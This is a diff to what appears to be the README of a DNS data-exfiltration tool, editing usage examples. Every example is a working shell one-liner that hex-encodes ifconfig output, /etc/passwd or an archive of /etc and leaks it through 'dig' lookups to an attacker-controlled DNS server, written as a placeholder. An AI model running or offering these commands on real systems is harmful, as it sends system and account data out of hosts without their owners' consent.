@@ -105,20 +105,20 @@ Hex support is coming, here's how to send hex-encoded data. Note that the `-p` f
 
 Send STDOUT:
 ```
-ifconfig | xxd -p -c31 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+ifconfig | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Send a file:
 ```
-xxd -p -c31 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+xxd -p -c31 < /etc/passwd | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Send a compressed file:
 ```
-gzip - < /etc/passwd | xxd -p -c31 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Send a compressed tar archive:
 ```
-tar czf - /etc | xxd -p -c31 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
